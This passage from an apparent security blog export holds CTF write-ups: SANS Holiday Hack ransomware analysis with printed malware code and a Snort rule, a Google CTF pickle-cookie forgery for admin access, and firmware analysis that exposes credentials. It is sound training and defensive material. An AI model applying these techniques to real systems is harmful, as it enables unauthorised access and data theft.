attachment. I grabbed the base64 encoded text, decoded it and opened the file. It is a PDF describing how to transpose piano keys.\nI completed the objective by submitting the song - Mary Had a Little Lamb.\nObjective 9: Ransomware Recovery Alabaster Snowball is in dire need of your help. Santa\u0026rsquo;s file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa\u0026rsquo;s server by completing several tasks.\nCatch the Malware: Assist Alabaster by building a Snort filter to identify the malware plaguing Santa\u0026rsquo;s Castle.\nI loaded up the Snort terminal:\nThe more_info.txt file provides us with an web interface, https://snortsensor1.kringlecastle.com/, that stores the last five minutes worth of pcaps. I grabbed a few of the pcaps and started looking at the malicious traffic:\nInteresting. I saw a lot of DNS traffic to various domains, with a very unique hex string. I wanted to understand that string before keying on it:\n\u0026gt;\u0026gt;\u0026gt; '77616E6E61636F6F6B69652E6D696E2E707331'.decode('hex') 'wannacookie.min.ps1' Ok, good. Since that is a wannacookie-specific string, it is a great item to key on. I built the Snort rule below to match the malicious traffic. It is worth noting this is not a production-ready rule due to its use of PCRE without at least one content keyword. I tested the rule by adding it to /etc/snort/rules/local.rules:\nelf@f770b1e2e77d:~$ vim /etc/snort/rules/local.rules elf@f770b1e2e77d:~$ cat !$ cat /etc/snort/rules/local.rules # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert udp any any -\u0026gt; any any (msg: \u0026quot;WannaCookie\u0026quot;; sid:66666666; rev:002; pcre:\u0026quot;/77616E6E61636F6F6B69652E6D696E2E707331./s\u0026quot;;) elf@f770b1e2e77d:~$ [+] Congratulation! Snort is alerting on all ransomware and only the ransomware! Objective completed!\nIdentify the Domain: Using the Word docm file, identify the domain name that the malware communicates with.\nWhere\u0026rsquo;s the fun in that? I decided to grab the malware off the wire. I grabbed a pcap from https://snortsensor1.kringlecastle.com/ and fired up tshark:\n$ tshark -Y dns -r snort.log.1545891713.0441875.pcap -Y 'dns.qry.name contains \u0026quot;77616E6E61636F6F6B69652E6D696E2E707331\u0026quot;' -T fields -e dns.txt \u0026gt; fused.txt $ sed '/^$/d' fused.txt | sed -n 'g;n;p' \u0026gt; fuse2.txt I put the content from fuse2.txt into CyberChef to decode the Hex:\nFinally, I opened the file in a text editor and replaced all the semi-colons with newlines to clean up the formatting. There were multiple references to erohetfanu.com throughout the malicious powershell script. I submitted erohetfanu.com to complete this objective.\nStop the Malware: Identify a way to stop the malware in its tracks!\nAlabaster mentions \u0026ldquo;another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.\u0026rdquo; I started analyzing the malware and found this line:\nif ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return} This looks promising, since 6B696C6C737769746368 hex decoded equates to \u0026ldquo;killswitch\u0026rdquo;. I used PowerShell ISE to complete this task. I loaded the PowerShell code, set a breakpoint at the killswitch line. Now, the call tries to resolve the name with 8.8.8.8. I removed the call to see what domain was being queried. With ISE, it is as simple as passing this into the debugger:\n$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) The screenshot below shows the output:\nI went over to the HoHoHoDaddy terminal and registered the yippeekiyaa.aaay domain:\nRegistering the domain completes this objective.\nRecover Alabaster\u0026rsquo;s Password: Recover Alabaster\u0026rsquo;s password as found in the the encrypted password vault.\nAfter completing the last objective, Alabaster provides a memory dump - his encrypted password database - and a request for help recovering his passwords. This objective was tough, but I had to cross the finish line. I had a general sense for what the PowerShell code was doing, but I went through and analyzed each part with PowerShell ISE to truly understand how it worked. I\u0026rsquo;ll keep this section brief, since this post is already fairly long.\nThe malware generates a random symmetric key and encrypts it using a public key that is retrieved with the g_o_dns function. In order to decrypt, I needed three items:\n The servers public key The servers private key The encrypted symmetric key  When decoding hex strings looking for the killswitch, I had discovered:\n\u0026gt;\u0026gt;\u0026gt; '7365727665722E637274'.decode('hex') 'server.crt' I started PowerShell ISE and set a breakpoint. I called the $(g_o_dns(\u0026ldquo;7365727665722E637274\u0026rdquo;) ) from the bottom terminal and obtained server.crt:\nHit Line breakpoint on \u0026#39;C:\\Users\\IEUser\\Documents\\wanna.ps1:112\u0026#39; [DBG]: PS C:\\Users\\IEUser\u0026gt;\u0026gt; $(g_o_dns(\u0026#34;7365727665722E637274\u0026#34;) ) MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50 ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5 ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+ kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G 2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7 MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF +w== [DBG]: PS C:\\Users\\IEUser\u0026gt;\u0026gt; I was stuck on the private key for awhile. Then, after reviewing my notes, I saw this hint from Shinny Upatree: \u0026ldquo;Perhaps there is a flaw in the wannacookie author\u0026rsquo;s DNS server that we can manipulate to retrieve what we need.\u0026rdquo; If left as the default, the name of the private key would be \u0026ldquo;server.key\u0026rdquo;. I built my own g_o_dns function using bash:\n$ for i in {0..13}; do dig -t txt $i.7365727665722e6b6579.erohetfanu.com @erohetfanu.com; done | grep TXT \u0026gt; ~/Downloads/dnscat.txt $ egrep -v \u0026quot;;\u0026quot; ~/Downloads/dnscat.txt | awk '{print $5}' That worked! Hex encoding server.key allowed me to grab the file through DNS TXT records. I dropped the output into CyberChef (it handles the quotes) and now I had the private key:\n-----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3 HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4 tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc 0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN 6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U 3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9 uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2 Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG 4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB 0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498 /P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q 8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4 eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4 Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq UdrzXvSwyFuuIqBlkHnWSIeC -----END PRIVATE KEY----- Next, I aimed at finding the encrypted symmetric key. I quickly verified the length of the key in ISE by setting a breakpoint and printing the length of p_k_e_k:\n[DBG]: PS C:\\Users\\IEUser\u0026gt;\u0026gt; $p_k_e_k.length 512 It is worth noting that this key is randomly generated, the key running in my VM cannot be used to decrypt Alabasters. I simply used it to verify the length before searching through the memory dump with PowerDump (LOL):\n: len == 512 ================ Filters ================ 1| LENGTH len(variable_values) == 512 [i] 1 powershell Variable Values found! ============== Search/Dump PS Variable Values =================================== COMMAND | ARGUMENT | Explanation ===============|=============================|================================= print | print [all|num] | print specific or all Variables dump | dump [all|num] | dump specific or all Variables contains | contains [ascii_string] | Variable Values must contain string matches | matches \u0026quot;[python_regex]\u0026quot; | match python regex inside quotes len | len [\u0026gt;|\u0026lt;|\u0026gt;=|\u0026lt;=|==] [bt_size]| Variables length \u0026gt;,\u0026lt;,=,\u0026gt;=,\u0026lt;= size clear | clear [all|num] | clear all or specific filter num =============================================================================== : print 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 Variable Values #1 above ^ Only one variable with that length, that must be the key. Next, I generated a PFX certificate using the servers public and private key using openssl:\nopenssl pkcs12 -export -out out.pfx -inkey server.key -in server.crt I imported the PFX cert in Windows using MMC.\nThat is everything I needed. Finally, I wrote a new function called decrypt, re-using a few of the functions from wannacookie. I included the code below, with just what I added to save some space:\nfunction decrypt{ $mycert = Get-Item \u0026#34;Cert:\\CurrentUser\\My\\B1D1E73DCBFFBD458B341A6E8AED3549A81077D6\u0026#34;; $foo = \u0026#34;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971\u0026#34;; $out = H2B($foo); [array]$f_c = $(Get-ChildItem -Path C:\\Users\\IEUser\\Desktop\\forensic_artifacts\\ -Recurse | Foreach-Object {$_.Fullname}) $bar = $mycert.PrivateKey.Decrypt($out, $true); e_n_d $bar $f_c $false; } I ran the decrypt function and the decrypted vault appeared in the directory. I issued the file command to see what type of file it was. It was a sqlite DB so I used sqlite3 to dump the passwords:\n$ file alabaster_passwords.elfdb alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002 $ sqlite3 alabaster_passwords.elfdb SQLite version 3.16.0 2016-11-04 19:09:39 Enter \u0026quot;.help\u0026quot; for usage hints. sqlite\u0026gt; .tables passwords sqlite\u0026gt; SELECT * from passwords; alabaster.snowball|CookiesR0cK!2!#|active directory alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com The password for Alabaster\u0026rsquo;s vault is ED#ED#EED#EF#G#F#G#ABA#BA#B. After giving Alabaster his decrypted DB, he said, \u0026ldquo;I’m seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password?\u0026rdquo;\nObjective 10: Who Is behind it All? Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan.\nThis is the final objective and to solve it, we have to unlock the piano lock. I confidently accessed the lock and entered the piano key password from Alabaster\u0026rsquo;s password vault. I was met with a message specifying, \u0026ldquo;Now that\u0026rsquo;s a good tune! But the key isn\u0026rsquo;t quite right\u0026hellip;\u0026rdquo;. A new hint from Alabaster Snowball appeared: \u0026ldquo;Really, it\u0026rsquo;s Mozart. And it should be in the key of D, not E.\u0026rdquo;\nInteresting. I dug up the PDF that Holly Evergreen had sent Alabaster during the Packalyzer challenge. The PDF had referenced transposition, which I used to convert the password.\nThe final password translated to - DC#DC#DDC#DEF#EF#GAG#AG#A. Using this, we play the piano lock and open the final door to reveal\u0026hellip;\nSanta was behind the whole KringleCon plan. Han and the Toy Soldiers (undercover Elves) work for him. The entire scenario was a test to find security professionals with skills across the various infosec domains to help defend the operation next year from any nefarious actors!\nConclusion Another great SANS Holiday Hack in the books! I loved the diversity of the challenges this year, which provided me with the opportunity to practice a number of different skills including pentesting, incident response, network forensics, malware analysis, and many more. As always, thank you to Ed Skoudis and the CounterHack team for putting it together.\nLooking forward to Holiday Hack 2019!\nMike\n",
    "ref": "/blog/sans-holiday-challenge-2018-writeup/"
  },{
    "title": "GoogleCTF - Spotted Quoll Write-Up",
    "date": "",
    "description": "",
    "body": "Intro I participated in the Google CTF this weekend and really enjoyed the challenges. Here is a write-up of one of my solutions.\nChallenge Spotted Quoll was a web challenge worth 50 points. The details of the challenge are in the image below.\nI loaded up the blog and looked for any clues:\nSolution I started up burp and reloaded the page. I navigated to the /admin section of the blog and received an error:\nA cookie called \u0026ldquo;obsoletePickle\u0026rdquo; was being passed with my requests.\nGET / HTTP/1.1 Host: spotted-quoll.ctfcompetition.com User-Agent: foo Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Cookie: obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu Connection: close I recognized the pickle module from my python studies.\n The pickle module implements a fundamental, but powerful algorithm for serializing and de-serializing a Python object structure.  I loaded up the string in python and decoded it:\n$ python \u0026gt;\u0026gt;\u0026gt; import pickle \u0026gt;\u0026gt;\u0026gt; import base64 \u0026gt;\u0026gt;\u0026gt; pickle.loads(\u0026#39;KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu\u0026#39;.decode(\u0026#39;base64\u0026#39;)) {\u0026#39;python\u0026#39;: \u0026#39;pickles\u0026#39;, \u0026#39;subtle\u0026#39;: \u0026#39;hint\u0026#39;, \u0026#39;user\u0026#39;: None} Interesting - it clearly shows \u0026lsquo;user\u0026rsquo; with no value. Let\u0026rsquo;s modify the cookie to change the user to \u0026lsquo;admin\u0026rsquo;.\n\u0026gt;\u0026gt;\u0026gt; pickle.dumps({\u0026#39;python\u0026#39;: \u0026#39;pickles\u0026#39;, \u0026#39;subtle\u0026#39;: \u0026#39;hint\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;admin\u0026#39;}) \u0026#34;(dp0\\nS\u0026#39;python\u0026#39;\\np1\\nS\u0026#39;pickles\u0026#39;\\np2\\nsS\u0026#39;subtle\u0026#39;\\np3\\nS\u0026#39;hint\u0026#39;\\np4\\nsS\u0026#39;user\u0026#39;\\np5\\nS\u0026#39;admin\u0026#39;\\np6\\ns.\u0026#34; \u0026gt;\u0026gt;\u0026gt; p = pickle.dumps({\u0026#39;python\u0026#39;: \u0026#39;pickles\u0026#39;, \u0026#39;subtle\u0026#39;: \u0026#39;hint\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;admin\u0026#39;}) \u0026gt;\u0026gt;\u0026gt; msg = base64.b64encode(p) \u0026gt;\u0026gt;\u0026gt; print msg KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4= \u0026gt;\u0026gt;\u0026gt; pickle.loads(\u0026#39;KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=\u0026#39;.decode(\u0026#39;base64\u0026#39;)) {\u0026#39;python\u0026#39;: \u0026#39;pickles\u0026#39;, \u0026#39;subtle\u0026#39;: \u0026#39;hint\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;admin\u0026#39;}”” Now instead of user being \u0026lsquo;None\u0026rsquo; it is \u0026lsquo;admin\u0026rsquo;:\n {'python': 'pickles', 'subtle': 'hint', 'user': admin}  I reloaded the /admin page and submitted my modified cookie.\n GET /admin HTTP/1.1 Host: spotted-quoll.ctfcompetition.com User-Agent: foo Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Cookie: obsoletePickle=KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4= Connection: close  Success! The flag is \u0026ldquo;CTF{but_wait,theres_more.if_you_call}\u0026rdquo;\n",
    "ref": "/blog/googlectf-spotted-quoll-write-up/"
  },{
    "title": "GSE Results",
    "date": "",
    "description": "",
    "body": "It\u0026rsquo;s official, I received the email from SANS letting me know that I earned the GSE certification! I am GSE #141 in a group of impressive information security professionals.\nThere are a ton of people that I would like to thank, including co-workers and friends. I would also like to thank Chris Sanders (GSE #64) for just being awesome and fielding some of my questions. Lastly, I would like to thank my lovely fiancée, Sophie, for putting up with my constant study and the late nights where, in her own words, I am \u0026ldquo;in the Matrix.\u0026rdquo;\nTaking the lab practical was quite an experience and I made some new friends during the stressful time. I would like to congratulate a few who sat the practical with me:\n Josh Brower - GSE #143 Chris Davis - GSE #144 Jon Mark Allen - GSE #145 Paul Ackerman\t- GSE #147 Shaun McCullough - GSE #148 Cary Barker - GSE #151  I won\u0026rsquo;t get into the details of the exam, but it was a fantastic challenge that tested a wide range of infosec skills. It was difficult (tough, but fair), and is not for the faint of heart.\nI have to admit, it was very nice getting a slew of emails the next morning regarding the re-up of all my SANS certs.\nWith the GSE done, it\u0026rsquo;s time to start programming and blogging more. Be on the lookout for some new posts and projects!\nHere are some links about the exam if you would like additional details:\nhttp://www.giac.org/certification/security-expert-gse https://danielmiessler.com/blog/the-giac-gse-the-grandmaster-of-information-security-certifications/ Thanks for reading!\nMike\n",
    "ref": "/blog/gse-results/"
  },{
    "title": "SANS Holiday Challenge 2015 - Writeup",
    "date": "",
    "description": "",
    "body": "Intro The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven\u0026rsquo;t documented them with the exception of some informal notes \u0026ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!\nOne other note: I finally finished writing this up. It\u0026rsquo;s about a month later than I expected, but life is busy.\nPart 0: Dosis Neighborhood The first step I took was to explore the Dosis neighborhood aka Holiday Hack Quest and complete all 21 achievements. As Johnny Drama would say, \u0026ldquo;VICTORY!\u0026rdquo;\nThis game was extremely fun and incredibly detailed, I was even able to drop by NetWars and say hello to Jeff McJunkin!\nThis was a pretty cool component to the challenge, offering mazes, riddles, and some hints for the analysis. As a huge Zelda fan, I admit that I was already very impressed even before beginning any actual hacking. My write-up is focused on the technical portions of the challenge and does not include a detailed walk-through of the game.\nPart 1: Curious Wireless Packets Josh Dosis informed us that \u0026ldquo;That gnome is not what he seemed!\u0026rdquo; and has captured some WiFi traffic from the network the gnome was on. He provided us with that capture and this is where the real fun starts.\nI completed this part of the challenge before the scapy helper scripts were provided, so I just used some command-line fu:\nmike@foo:~$ tcpdump -nnAr giyh-capture.pcap \u0026#39;src 52.2.229.189\u0026#39; | grep \u0026#39; TXT \u0026#39; | awk \u0026#39;{print $15}\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 \u0026gt; foo.txt reading from file giyh-capture.pcap, link-type IEEE802_11_RADIO (802.11 plus radiotap header) tcpdump: pcap_loop: truncated dump file; tried to read 117 captured bytes, only got 43 mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode | grep -v \u0026#34;NONE:\u0026#34; \u0026gt;\u0026gt; bar.txt; done A few notes on this:\n  I only grabbed packets with the SuperGnome as the source. The packets with the Gnome as the source will just contain the output from the commands.  I removed the double-quotes and base64 decoded the lines.  Using grep -v, I removed the lines containing \"NONE:\" as those indicate no operation.  The output was:  EXEC:iwconfig EXEC:cat /tmp/iwlistscan.txt FILE:/root/Pictures/snapshot_CURRENT.jpg  This answers question #1 and alludes to the answer for #2:\n1) Which commands are sent across the Gnome’s command-and-control channel?\nThe two commands sent across the C2 channel were:\n  iwconfig  cat /tmp/iwlistscan.txt  Modifying my one-liners allowed me to grab the image sent across the channel. mike@foo:~$ tcpdump -nnAr giyh-capture.pcap \u0026#39;src 10.42.0.18\u0026#39; | grep \u0026#39; TXT \u0026#39; | awk \u0026#39;{print $20}\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 \u0026gt; foo.txt mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode \u0026gt;\u0026gt; bar.txt; done mike@foo:~$ vim bar.txt mike@foo:~$ sed -i \u0026#34;s/FILE://g\u0026#34; bar.txt mike@foo:~$ mv bar.txt bar.jpg Notes:\n  I changed the source from the SuperGnome (52.2.229.189) to the Gnome (10.42.0.18) in order to grab the file sent.  I manually altered the original decoded data, in *vim*, and removed everything until the \"FILE:\" calls.  Using sed -i, I removed the \"FILE:\" calls from the file.  Finally, I changed the extension from txt to jpg and verified my result.  The result answers question \\#2: 2) What image appears in the photo the Gnome sent across the channel from the Dosis home?\nPart 2: Firmware Analysis for Fun and Profit I navigated over to Josh Dosis in the Dosis neighborhood and provided him with watermark from the image sent over the channel.\nHe directed me to Jess Dosis, who provided me with a firmware image and the following instructions:\n\u0026ldquo;I took the liberty of disassembling the Gnome and dumped the NAND storage using my Xeltek SuperPro 6100 to a file. Can you extract a password from this data dump?\u0026rdquo;\nNow I play with packet captures all day, but firmware analysis?! I decided to do some additional research and see if I could learn some new skills.\n{% codeblock lang:bash %} mike@foo:~/sans-holiday-hack-2015$ ls giyh-firmware-dump.bin {% endcodeblock %}\nUsing binwalk, I extracted the files filed found in the firmware using the -e option.\n mike@foo:~/sans-holiday-hack-2015$ binwalk -e giyh-firmware-dump.bin DECIMAL HEX DESCRIPTION ------------------------------------------------------------------------------------------------------- 0 0x0 PEM certificate 1809 0x711 ELF 32-bit LSB shared object, ARM, version 1 (SYSV) 168803 0x29363 Squashfs filesystem, little endian, version 4.0, compression: gzip, size: 17376149 bytes, 4866 inodes, blocksize: 131072 bytes, created: Tue Dec 8 13:47:32 2015 mike@foo:~/sans-holiday-hack-2015$ ls 29363.squashfs giyh-firmware-dump.bin  Interesting \u0026ndash; a squashfs fileystsem, used mainly in tiny-sized and embedded Linux systems, which sounds like the gnomes. I installed squashfs-tools and used the tool unsquashfs to extract the data.\n mike@foo:~/sans-holiday-hack-2015$ unsquashfs 29363.squashfs Parallel unsquashfs: Using 2 processors 3936 inodes (5763 blocks) to write [========================================================================================================================================================================================================================-] 5763/5763 100% created 3899 files created 930 directories created 37 symlinks created 0 devices created 0 fifos mike@foo:~/sans-holiday-hack-2015/squashfs-root$ ls bin etc init lib mnt opt overlay rom root sbin tmp usr var www  Great! We can simply look around now. Let\u0026rsquo;s run some quick commands to answer the questions:\n mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/banner _______ ________ __ | |.-----.-----.-----.| | | |.----.| |_ | - || _ | -__| || | | || _|| _| |_______|| __|_____|__|__||________||__| |____| |__| W I R E L E S S F R E E D O M ----------------------------------------------------- DESIGNATED DRIVER (Bleeding Edge, r47650) ----------------------------------------------------- * 2 oz. Orange Juice Combine all juices in a * 2 oz. Pineapple Juice tall glass filled with * 2 oz. Grapefruit Juice ice, stir well. * 2 oz. Cranberry Juice ----------------------------------------------------- mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/openwrt_release DISTRIB_ID=**'OpenWrt'** DISTRIB_RELEASE='Bleeding Edge' DISTRIB_REVISION='r47650' DISTRIB_CODENAME='designated_driver' DISTRIB_TARGET='realview/generic' DISTRIB_DESCRIPTION='OpenWrt Designated Driver r47650' DISTRIB_TAINTS='' mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat www/app.js | head -n 15 **var express = require('express');** var path = require('path'); var favicon = require('serve-favicon'); var logger = require('morgan'); var cookieParser = require('cookie-parser'); var bodyParser = require('body-parser'); var routes = require('./routes/index'); **var mongo = require('mongodb');** var monk = require('monk'); **var db = monk('gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome')** **var app = express();** // view engine setup app.set('views', path.join(\\__dirname, 'views')); app.set('view engine', 'jade');  To fully answer the second question, we need to collect some more information on the mongodb.\n mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/mongod.conf # LOUISE: No logging, YAY for /dev/null # AUGGIE: Louise, stop being so excited to basic Unix functionality # LOUISE: Auggie, stop trying to ruin my excitement! systemLog: destination: file path: /dev/null logAppend: true storage: **dbPath: /opt/mongodb** net: bindIp: 127.0.0.1 mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ mongodump --dbpath ../opt/mongodb/ mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ ls dump **mongodb** mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ cd dump/gnome/ mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ ls cameras.bson cameras.metadata.json settings.bson settings.metadata.json status.bson status.metadata.json system.indexes.bson **users.bson** users.metadata.json mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ bsondump users.bson { \u0026quot;\\_id\u0026quot; : ObjectId( \u0026quot;56229f58809473d11033515b\u0026quot; ), \u0026quot;username\u0026quot; : **\u0026quot;user\u0026quot;**, \u0026quot;password\u0026quot; : **\u0026quot;user\u0026quot;**, \u0026quot;user_level\u0026quot; : 10 } { \u0026quot;\\_id\u0026quot; : ObjectId( \u0026quot;56229f63809473d11033515c\u0026quot; ), \u0026quot;username\u0026quot; : 